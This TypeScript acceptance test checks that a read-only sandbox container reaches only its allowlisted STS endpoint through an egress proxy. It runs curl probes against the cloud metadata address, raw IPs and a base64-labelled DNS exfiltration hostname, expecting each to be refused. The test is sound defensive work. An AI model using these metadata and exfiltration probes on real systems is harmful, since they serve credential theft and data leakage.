// Issue #1956 (acceptance criterion 7, egress): a need box of a read-only template, run by the hopper's sandbox module
// (`createSandboxes`, its real flags) through the real container runtime, behind the real egress proxy: the compose service
// `egress` on an internal network (support/egress.ts), its allowlist written by the hopper's `createEgress` from the
// box's credentials. The box reaches the host its credentials name, through the proxy, and nothing else. Not part of
// `npm test`: `npm run test:cloud` (vitest.cloud.config.ts).
//
// Feature: a read-only need box reaches out only to its allowlist
//   Scenario: the minted endpoint works; a public host, the metadata address, raw IPs and DNS exfiltration are blocked
//     Given a read-only template's need box whose credential names an STS endpoint (moto, on a routed network)
//     When the box's command asks the endpoint through the proxy, with curl and with the aws CLI
//     Then both get an answer, and past the proxy the endpoint does not resolve
//     When it asks a public host, the metadata address, a raw IP and the endpoint by its IP
//     Then the proxy refuses each (403), and past the proxy none has a route
//     When it asks the proxy for a name that carries data, or looks up a public name itself
//     Then the proxy refuses the name, and the box's resolver answers no public name
//     And the box ran with the sandbox flags: no capability, no new privileges, a read-only root
//     And after the step no box and no home volume of it remain
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { SandboxRepository } from '../../src/domain/store.ts';
import { createEgress } from '../../src/sandbox/egress.ts';
import { NEED_LABEL, needEnv, type NeedCredential } from '../../src/sandbox/need-box.ts';
import { createSandboxes } from '../../src/sandbox/service.ts';
import { memorySandboxRuns } from '../support/sandbox-runs.ts';
import { BOX_BASE, cli, readOnlyBoxImage, runtime } from './support/box.ts';
import { startEgressStack, type EgressStack } from './support/egress.ts';
import { ACCOUNT, REGION } from './support/moto.ts';

const INSTANCE = `acceptance-egress-${process.pid}`;
const PUBLIC = 'example.com';
const METADATA = '169.254.169.254';
const RAW_IP = '1.1.1.1';
/** A name that carries data in its first label, as a DNS exfiltration would. */
const EXFIL = 'c2VjcmV0LWRhdGE.exfil.example.com';

let stack: EgressStack;
let dir: string;

beforeAll(async () => {
  // The image the hopper makes for the template, built once (terraform.test.ts builds the same one).
  await readOnlyBoxImage();
  stack = await startEgressStack();
  dir = mkdtempSync(join(tmpdir(), 'hopper-acceptance-step-'));
}, 1_200_000);
afterAll(async () => {
  await stack?.end();
  if (dir) rmSync(dir, { recursive: true, force: true });
});

const repo = (): Pick<SandboxRepository, 'list' | 'remove'> => ({ list: () => [], remove: () => false });

/** One probe: curl's exit code, the HTTP status it got (000: none) and the first line of its error. */
const probe = (name: string, args: string): string =>
  `c=$(curl -sS -o /dev/null -w '%{http_code}' --connect-timeout 5 -m 15 ${args} 2>"$HOME/err"); e=$?; echo "probe ${name} exit=$e code=$c $(head -n 1 "$HOME/err")"`;

interface Probe { exit: number; code: string; error: string }
function probes(log: string): Map<string, Probe> {
  const out = new Map<string, Probe>();
  for (const m of log.matchAll(/^probe (\S+) exit=(\d+) code=(\d{3})\s?(.*)$/gm)) out.set(m[1]!, { exit: Number(m[2]), code: m[3]!, error: m[4]!.trim() });
  return out;
}

describe('a read-only need box behind the egress proxy (issue #1956, criterion 7)', () => {
  it('reaches its minted endpoint through the proxy and nothing else', async () => {
    const { host, port, ip } = stack.allowed;
    const endpoint = `http://${host}:${port}`;
    const credential: NeedCredential = {
      profile: { operation: 'read', asset: { kind: 'aws-role', name: `${ACCOUNT}/read` } },
      minted: { kind: 'aws', AccessKeyId: 'AKIAEGRESSACCEPT', SecretAccessKey: 'egress-secret-not-real', SessionToken: 'egress-session-not-real', Expiration: new Date(Date.now() + 900_000).toISOString() },
      reach: { kind: 'aws', region: REGION, stsEndpoint: endpoint },
    };
    const past = `--noproxy '*'`;
    const command = [
      probe('allowed', `${endpoint}/moto-api/`),
      probe('allowed-past', `${past} ${endpoint}/moto-api/`),
      probe('allowed-ip', `http://${ip}:${port}/moto-api/`),
      probe('allowed-ip-past', `${past} http://${ip}:${port}/moto-api/`),
      probe('public', `https://${PUBLIC}/`),
      probe('public-past', `${past} https://${PUBLIC}/`),
      probe('metadata', `http://${METADATA}/latest/meta-data/`),
      probe('metadata-past', `${past} http://${METADATA}/latest/meta-data/`),
      probe('raw-ip', `https://${RAW_IP}/`),
      probe('raw-ip-past', `${past} https://${RAW_IP}/`),
      probe('exfil', `http://${EXFIL}/`),
      `aws sts get-caller-identity --query Account --output text > "$HOME/account" 2>"$HOME/err"; echo "aws exit=$? account=$(cat "$HOME/account") $(head -n 1 "$HOME/err")"`,
      `getent hosts ${PUBLIC} >/dev/null; echo "dns public=$?"`,
      `getent hosts ${EXFIL} >/dev/null; echo "dns exfil=$?"`,
      `touch /hopper-root-written 2>/dev/null; echo "root written=$?"`,
      `grep -E '^(CapEff|NoNewPrivs):' /proc/self/status | tr -s '\\t ' ' '`,
    ].join('\n');
    const sandboxes = createSandboxes({
      runtime: runtime(), repo: repo(), runs: memorySandboxRuns(), instanceId: INSTANCE, network: 'none',
      egress: createEgress({ network: stack.network, proxy: stack.proxy, dir: stack.dir }),
      clock: { now: () => new Date() }, logger: { info() {}, warn() {} },
    });
    let log = '';
    const name = `hopper-acceptance-need-${process.pid}`;
    const r = await sandboxes.needStep('u1', {
      name, template: { image: BOX_BASE, tools: ['terraform', 'aws'], readOnly: true },
      env: needEnv({ command, outputs: [], credentials: [credential] }), reaches: [credential.reach], timeoutMs: 300_000, dir,
    }, { log: (chunk) => { log += chunk; }, signal: new AbortController().signal, pollMs: 500 }, { jobId: 'job-egress', step: 'step-egress', template: 'infra-read' });
    expect(r.problem, log).toBeUndefined();
    expect(r.exit, log).toBe(0);
    const p = probes(log);

    // The minted endpoint, through the proxy: curl and the aws CLI get moto's answer.
    expect(p.get('allowed'), log).toMatchObject({ exit: 0, code: '200' });
    expect(log).toMatch(new RegExp(`^aws exit=0 account=${ACCOUNT}`, 'm'));
    // Refused by the proxy: a CONNECT answered 403 (curl exit 56), or a plain request answered 403.
    const refused = (k: string): void => {
      const got = p.get(k);
      expect(got, `${k}\n${log}`).toBeDefined();
      expect(got!.code === '403' || /response 403/.test(got!.error), `${k}: ${JSON.stringify(got)}`).toBe(true);
    };
    // Past the proxy: no answer at all, the name does not resolve (6) or the address has no route (7, 28).
    const noRoute = (k: string): void => {
      const got = p.get(k);
      expect(got, `${k}\n${log}`).toBeDefined();
      expect(got!.code, k).toBe('000');
      expect([6, 7, 28], `${k}: ${JSON.stringify(got)}`).toContain(got!.exit);
    };
    for (const k of ['allowed-ip', 'public', 'metadata', 'raw-ip', 'exfil']) refused(k);
    for (const k of ['allowed-past', 'allowed-ip-past', 'public-past', 'metadata-past', 'raw-ip-past']) noRoute(k);
    // DNS: the box's resolver answers no public name, so a name that carries data never leaves it.
    expect(log).toMatch(/^dns public=[1-9]/m);
    expect(log).toMatch(/^dns exfil=[1-9]/m);
    // The proxy says why it refused each: the host is off its filter.
    const proxyLog = await stack.log();
    for (const h of [ip, PUBLIC, METADATA, RAW_IP, EXFIL]) expect(proxyLog).toContain(`Proxying refused on filtered domain "${h}"`);

    // The sandbox flags: no capability, no new privileges, a read-only root.
    expect(log).toMatch(/^root written=[1-9]/m);
    expect(log).toMatch(/^CapEff: 0+\s*$/m);
    expect(log).toMatch(/^NoNewPrivs: 1\s*$/m);

    // The box and its home volume are burned after the step.
    expect((await cli(['ps', '-a', '-q', '--filter', `label=${NEED_LABEL}=${INSTANCE}`])).stdout.trim()).toBe('');
    expect((await cli(['volume', 'ls', '-q'])).stdout.split('\n')).not.toContain(`${name}-home`);
  }, 600_000);
});
